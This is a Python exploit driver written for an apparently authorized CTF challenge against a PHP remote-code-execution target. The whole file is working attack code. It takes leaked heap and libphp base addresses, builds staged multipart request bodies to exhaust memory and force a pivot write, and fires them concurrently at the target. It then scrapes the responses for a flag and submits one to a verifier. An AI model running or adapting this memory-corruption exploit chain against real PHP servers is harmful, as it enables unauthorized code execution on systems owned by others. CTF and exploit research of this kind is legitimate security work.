#!/usr/bin/env python3
"""Bounded rolling SEEDFIRE attempt for the authorized Cloudflare CTF.

The request bodies and HTTP envelope come from ``wave_stock_live.py``.  The
only material orchestration change is the terminal schedule: eight S requests
start together and one D request is submitted immediately when each S request
completes.  This is the schedule that produced ``FLAG_OK`` on the eight-worker
official Docker twin with block 0x59400.
"""

from __future__ import annotations

import argparse
from concurrent.futures import Future, ThreadPoolExecutor, as_completed
import hashlib
import importlib
import json
import os
from pathlib import Path
import re
import secrets
import sys
import time
from types import ModuleType


HOST = "php-rce.cloudflare.app"
PORT = 443
PATH = "/php/index.php"
BLOCK = 0x59400
ARMS = 80
B_COUNT = 25
TERMINAL_COUNT = 25
S_HEADERS = 600_000
D_HEADERS = 402_500
REQUEST_CAP = ARMS + B_COUNT + (2 * TERMINAL_COUNT)
ALIGNMENT = 0x200000
WIRE_PINS = {
    "A": {
        "bytes": 2_061_026,
        "sha256": "39d5e3d145b1aeab8b0f4e1ce44eaac3348b8c7a3efe1819663fef87814f05de",
    },
    "B": {
        "bytes": 2_001_197,
        "sha256": "ed8a43163cad8fafff484e3b8bc03e0966e25e0a40a451c0ba11fcdb5f1a82ae",
    },
    "S": {"bytes": 8_254_269},
    "D": {
        "bytes": 7_186_748,
        "sha256": "cf5e7a64b12a0ee18b48052dabc8c7c7335c1aebe4c6414e65e0179bc752bc37",
    },
}
ATTEMPT_RE = re.compile(
    r"(?i)^[0-9a-f]{8}-(?:[0-9a-f]{4}-){3}[0-9a-f]{12}$"
)
SID_RE = re.compile(r"[A-Za-z0-9,-]{19}")
BRACED_FLAG_RE = re.compile(rb"[A-Za-z0-9_]{2,24}\{[^\r\n}]{4,256}\}")
UUID_FLAG_RE = re.compile(
    rb"[0-9a-fA-F]{8}-(?:[0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}"
)


def load_wave() -> ModuleType:
    """Import the preserved live controller and its pinned stock builders."""
    for candidate in (Path("/root/bridge/stock"), Path(__file__).resolve().parent):
        value = str(candidate)
        if candidate.is_dir() and value not in sys.path:
            sys.path.insert(0, value)
    return importlib.import_module("wave_stock_live")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--heap", type=lambda value: int(value, 0), required=True)
    parser.add_argument("--libphp", type=lambda value: int(value, 0), required=True)
    parser.add_argument("--timeout", type=float, default=75.0)
    parser.add_argument("--out-dir", type=Path, required=True)
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--authorized-live", action="store_true")
    parser.add_argument("--session-id", required=True)
    return parser


def validate_args(parser: argparse.ArgumentParser, args: argparse.Namespace) -> None:
    if not args.dry_run and not args.authorized_live:
        parser.error("live execution requires --authorized-live")
    if args.heap <= 0 or args.libphp <= 0:
        parser.error("heap and libphp must be positive")
    if args.heap % ALIGNMENT or args.libphp % ALIGNMENT:
        parser.error("heap and libphp must be 2 MiB aligned")
    if not 1.0 <= args.timeout <= 300.0:
        parser.error("timeout must be in 1..300 seconds")
    if os.path.lexists(args.out_dir):
        parser.error("--out-dir must be fresh")
    if not SID_RE.fullmatch(args.session_id):
        parser.error("--session-id must be exactly 19 legal PHP session characters")


def install_stable_session_sender(wave: ModuleType, session_id: str) -> None:
    """Replace only d_calibrate_live.send's request-head construction."""
    cookie = f"Cookie: PHPSESSID={session_id}\r\n".encode("ascii")

    def send(body, boundary, timeout, chunked, *, host, port, path, tls):
        sock = wave.base.socket.create_connection((host, port), timeout=timeout)
        if tls:
            sock = wave.base.ssl.create_default_context().wrap_socket(
                sock, server_hostname=host
            )
        sock.settimeout(timeout)
        framing = (
            b"Transfer-Encoding: chunked\r\n"
            if chunked
            else b"Content-Length: " + str(len(body)).encode("ascii") + b"\r\n"
        )
        head = (
            b"POST " + path.encode("ascii") + b" HTTP/1.1\r\n"
            b"Host: " + host.encode("ascii") + b"\r\n"
            b"User-Agent: cfctf-bounded-d-cal/1\r\n"
            b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
            + framing
            + cookie
            + b"Connection: close\r\n\r\n"
        )
        response = bytearray()
        try:
            sock.sendall(head)
            if chunked:
                view = memoryview(body)
                for offset in range(0, len(body), 65_536):
                    piece = view[offset : offset + 65_536]
                    sock.sendall(f"{len(piece):x}\r\n".encode("ascii"))
                    sock.sendall(piece)
                    sock.sendall(b"\r\n")
                sock.sendall(b"0\r\n\r\n")
            else:
                sock.sendall(body)
            while len(response) < 16 * 1024 * 1024:
                try:
                    piece = sock.recv(65_536)
                except (TimeoutError, wave.base.socket.timeout):
                    break
                if not piece:
                    break
                response.extend(piece)
        finally:
            try:
                sock.close()
            except OSError:
                pass
        return bytes(response)

    wave.base.send = send


def response_entity(raw: bytes) -> bytes:
    head, separator, body = raw.partition(b"\r\n\r\n")
    if not separator:
        return raw
    if b"transfer-encoding: chunked" not in head.lower():
        return body
    decoded = bytearray()
    remaining = body
    try:
        while remaining:
            line, separator, remaining = remaining.partition(b"\r\n")
            if not separator:
                break
            size = int(line.split(b";", 1)[0], 16)
            if size == 0:
                break
            if len(remaining) < size + 2:
                break
            decoded.extend(remaining[:size])
            remaining = remaining[size + 2 :]
    except ValueError:
        return body
    return bytes(decoded)


def canonical_attempt_id(raw: bytes) -> str | None:
    match = re.search(rb"(?i)x-attempt-id:\s*([^\r\n]+)", raw)
    if not match:
        return None
    value = match.group(1).decode("ascii", "ignore").strip()
    return value if ATTEMPT_RE.fullmatch(value) else None


def bound_flag(raw: bytes, marker: bytes) -> str | None:
    """Return only a bounded flag immediately following this run's marker."""
    entity = response_entity(raw)
    offset = entity.find(marker)
    if offset < 0:
        return None
    tail = entity[offset + len(marker) :]
    match = BRACED_FLAG_RE.match(tail) or UUID_FLAG_RE.match(tail)
    return match.group(0).decode("ascii") if match else None


def terminal_candidate(raw: bytes, marker: bytes) -> tuple[str, str] | None:
    flag = bound_flag(raw, marker)
    attempt = canonical_attempt_id(raw)
    if flag is None or attempt is None:
        return None
    return attempt, flag


def sanitize_record(record: dict) -> dict:
    """Keep proof metadata in JSON without duplicating a returned flag."""
    clean = dict(record)
    flag = clean.pop("flag", None)
    preview = clean.pop("preview", None)
    if isinstance(preview, str):
        encoded_preview = preview.encode("utf-8", "replace")
        clean["preview_sha256"] = hashlib.sha256(encoded_preview).hexdigest()
        clean["preview_bytes"] = len(encoded_preview)
    # Keep the historical summary contract (``row['flag']`` is truthy) while
    # never serialising the returned flag itself.
    clean["flag"] = bool(flag)
    clean["flag_present"] = bool(flag)
    if flag:
        clean["flag_sha256"] = hashlib.sha256(flag.encode("ascii")).hexdigest()
        clean["flag_bytes"] = len(flag)
    return clean


def full_wave_gate(label: str, summary: dict) -> bool:
    """Require the exact all-lanes OOM receipt proven live and in the twin."""
    expected = {"A": ARMS, "B": B_COUNT}[label]
    return (
        summary.get("requests") == expected
        and summary.get("status_200") == expected
        and summary.get("oom_4096") == expected
    )


def validate_wire_pins(wire: dict) -> None:
    for label, expected in WIRE_PINS.items():
        actual = wire.get(label, {})
        for key, value in expected.items():
            if actual.get(key) != value:
                raise RuntimeError(
                    f"{label} wire {key} drift: {actual.get(key)!r} != {value!r}"
                )
    expected_counts = {"A": ARMS, "B": B_COUNT, "S": TERMINAL_COUNT, "D": TERMINAL_COUNT}
    for label, count in expected_counts.items():
        if wire.get(label, {}).get("count") != count:
            raise RuntimeError(f"{label} wire count drift")


def first_verifier_candidate(
    d_raw_rows: list[tuple[dict, bytes]], marker: bytes
) -> tuple[dict, str, str] | None:
    """Select at most one response-local verifier candidate."""
    for record, raw in d_raw_rows:
        candidate = terminal_candidate(raw, marker)
        if candidate is None:
            continue
        attempt, flag = candidate
        return record, attempt, flag
    return None


def sanitize_verification(verification: dict) -> dict:
    """Keep verifier proof without persisting its response entity inline."""
    clean = dict(verification)
    body = clean.pop("body", None)
    if isinstance(body, str):
        encoded = body.encode("utf-8", "replace")
        clean["body_sha256"] = hashlib.sha256(encoded).hexdigest()
        clean["body_bytes"] = len(encoded)
    return clean


def run_rolling_terminal(
    *,
    wave: ModuleType,
    s_body: bytes,
    d_body: bytes,
    boundary: bytes,
    marker: bytes,
    timeout: float,
    out_dir: Path,
) -> tuple[list[dict], list[tuple[dict, bytes]]]:
    """Fan out S and submit one D immediately from each successful S completion."""
    rows: dict[int, dict] = {
        index: {"index": index, "S": None, "D": None, "handoff_ms": None}
        for index in range(TERMINAL_COUNT)
    }
    d_futures: dict[Future, tuple[int, float, float]] = {}
    d_raw_rows: list[tuple[dict, bytes]] = []

    with ThreadPoolExecutor(max_workers=TERMINAL_COUNT) as s_executor, \
            ThreadPoolExecutor(max_workers=TERMINAL_COUNT) as d_executor:
        s_futures = {
            s_executor.submit(
                wave.send_one,
                "S",
                index,
                s_body,
                boundary,
                marker,
                timeout,
            ): index
            for index in range(TERMINAL_COUNT)
        }
        for future in as_completed(s_futures):
            index = s_futures[future]
            record, raw = future.result()
            completed = time.monotonic()
            wave.base.write_exclusive(out_dir / f"S-{index:03d}.raw", raw)
            rows[index]["S"] = sanitize_record(record)
            if record.get("status") != 200 or record.get("oom_tried_bytes") != 4096:
                continue
            queued = time.monotonic()
            d_future = d_executor.submit(
                wave.send_one,
                "D",
                index,
                d_body,
                boundary,
                marker,
                timeout,
            )
            d_futures[d_future] = (index, completed, queued)

        # Every submitted request is drained and receipted.  Success handling is
        # deliberately outside worker threads so verifier calls remain <= 1.
        for future in as_completed(d_futures):
            index, s_completed, queued = d_futures[future]
            record, raw = future.result()
            began = time.monotonic() - float(record.get("elapsed_s") or 0.0)
            wave.base.write_exclusive(out_dir / f"D-{index:03d}.raw", raw)
            rows[index]["D"] = sanitize_record(record)
            rows[index]["handoff_ms"] = round((began - s_completed) * 1000, 3)
            rows[index]["d_executor_queue_ms"] = round((began - queued) * 1000, 3)
            d_raw_rows.append((record, raw))

    return [rows[index] for index in sorted(rows)], d_raw_rows


def public_summary(receipt: dict) -> dict:
    """Return the stdout-safe result; never include response or flag material."""
    return {
        "verdict": receipt.get("verdict"),
        "request_count": receipt.get("request_count"),
        "verifier_called": bool(receipt.get("verification_attempts")),
        "verifier_accepted": bool(
            isinstance(receipt.get("verifier"), dict)
            and receipt["verifier"].get("verified") is True
        ),
        "out": receipt.get("out"),
    }


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    validate_args(parser, args)
    args.out_dir.mkdir(mode=0o700)

    wave = load_wave()
    install_stable_session_sender(wave, args.session_id)
    marker = ("SEEDFIRE-" + secrets.token_hex(3) + "|").encode("ascii")
    profile = dict(wave.terminal.PROFILES["official-docker"])

    a = wave.base.add_preamble(wave.single.arm_body())
    b = wave.base.add_preamble(
        wave.stock.finish_b_multipart(wave.stock.build_b_fields(426_950, 21))
    )
    s = wave.base.add_preamble(
        wave.terminal.build_seed_body(
            args.heap,
            args.libphp,
            BLOCK,
            10,
            marker,
            seeds=1,
            oom_count=0,
            oom_depth=57,
            oom_headers=S_HEADERS,
            pressure_fields=45,
            probe=False,
            profile=profile,
            fd_mode="derived-adjacent",
        )
    )
    d = wave.base.add_preamble(wave.base.build_fire_body(D_HEADERS))

    wire = {
        "A": {"bytes": len(a), "sha256": hashlib.sha256(a).hexdigest(), "count": ARMS},
        "B": {"bytes": len(b), "sha256": hashlib.sha256(b).hexdigest(), "count": B_COUNT},
        "S": {"bytes": len(s), "sha256": hashlib.sha256(s).hexdigest(), "count": TERMINAL_COUNT},
        "D": {"bytes": len(d), "sha256": hashlib.sha256(d).hexdigest(), "count": TERMINAL_COUNT},
    }
    validate_wire_pins(wire)
    receipt = {
        "schema": "cfctf/rolling-seedfire-live/v1",
        "target": f"https://{HOST}{PATH}",
        "heap": hex(args.heap),
        "libphp": hex(args.libphp),
        "block": hex(BLOCK),
        "profile": "official-docker",
        "terminal_mode": "derived-adjacent",
        "schedule": "A80; B25; S8 fanout; D submitted on each successful S completion",
        "session": {
            "id": args.session_id,
            "length": len(args.session_id),
            "cookie_on_A_B_S_D": True,
            "multipart_bodies_modified": False,
        },
        "request_cap": REQUEST_CAP,
        "marker": marker.decode("ascii"),
        "wire": wire,
        "stages": {},
        "summary": {},
        "terminal_pairs": [],
        "request_count": 0,
        "verification_attempts": [],
        "verifier": None,
        "verdict": "NOT_RUN",
        "out": str(args.out_dir),
    }

    if args.dry_run:
        receipt["verdict"] = "DRY_RUN"
        wave.write_receipt(args.out_dir / "receipt.json", receipt)
        print(json.dumps(public_summary(receipt), indent=2, sort_keys=True))
        return 0

    for label, count, body, boundary in (
        ("A", ARMS, a, wave.single.ARM_BOUNDARY),
        ("B", B_COUNT, b, wave.single.DISC_BOUNDARY),
    ):
        rows = wave.run_wave(
            label,
            count,
            body,
            boundary,
            marker,
            args.timeout,
            args.out_dir,
        )
        receipt["stages"][label] = [sanitize_record(row) for row in rows]
        receipt["summary"][label] = wave.summarize(rows)
        receipt["request_count"] += len(rows)
        wave.write_receipt(args.out_dir / f"checkpoint-{label}.json", receipt)
        if not full_wave_gate(label, receipt["summary"][label]):
            receipt["verdict"] = f"{label}_FULL_WAVE_GATE_MISS"
            break
    else:
        pairs, d_raw_rows = run_rolling_terminal(
            wave=wave,
            s_body=s,
            d_body=d,
            boundary=wave.terminal.BOUNDARY,
            marker=marker,
            timeout=args.timeout,
            out_dir=args.out_dir,
        )
        receipt["terminal_pairs"] = pairs
        s_rows = [row["S"] for row in pairs if row.get("S") is not None]
        d_rows = [row["D"] for row in pairs if row.get("D") is not None]
        receipt["summary"]["S"] = wave.summarize(s_rows)
        receipt["summary"]["D"] = wave.summarize(d_rows)
        receipt["request_count"] += len(s_rows) + len(d_rows)

        pivot_rows = [row for row in d_rows if row.get("early_canary") or row.get("marker")]
        receipt["verdict"] = "NO_PIVOT_WRITE_OBSERVED"
        if pivot_rows:
            receipt["verdict"] = "PIVOT_WRITE_OBSERVED"

        # Only the first response-local marker+flag+canonical-attempt candidate
        # may invoke the verifier.  Additional D responses are evidence only.
        candidate = first_verifier_candidate(d_raw_rows, marker)
        if candidate is not None:
            record, attempt, flag = candidate
            verification, verify_raw = wave.verify_flag(attempt, flag, args.timeout)
            public_verification = sanitize_verification(verification)
            verify_name = f"verify-{int(record['index']):03d}.raw"
            wave.base.write_exclusive(args.out_dir / verify_name, verify_raw)
            receipt["verification_attempts"].append({
                "d_index": int(record["index"]),
                "attempt_id": attempt,
                "flag_sha256": hashlib.sha256(flag.encode("ascii")).hexdigest(),
                "flag_bytes": len(flag),
                "raw_path": verify_name,
                **public_verification,
            })
            if verification.get("verified") is True:
                wave.base.write_exclusive(
                    args.out_dir / "flag.txt", (flag + "\n").encode("ascii")
                )
                receipt["verifier"] = public_verification
                receipt["winning_d_index"] = int(record["index"])
                receipt["verdict"] = "VERIFIER_ACCEPTED"
            else:
                receipt["verdict"] = "FLAG_NOT_VERIFIED"

        wave.write_receipt(args.out_dir / "checkpoint-terminal.json", receipt)

    if receipt["request_count"] > REQUEST_CAP:
        raise RuntimeError("request cap violated")
    if len(receipt["verification_attempts"]) > 1:
        raise RuntimeError("verifier cap violated")
    wave.write_receipt(args.out_dir / "receipt.json", receipt)
    print(json.dumps(public_summary(receipt), indent=2, sort_keys=True))
    return 0 if receipt["verdict"] == "VERIFIER_ACCEPTED" else 2


if __name__ == "__main__":
    raise SystemExit(main())
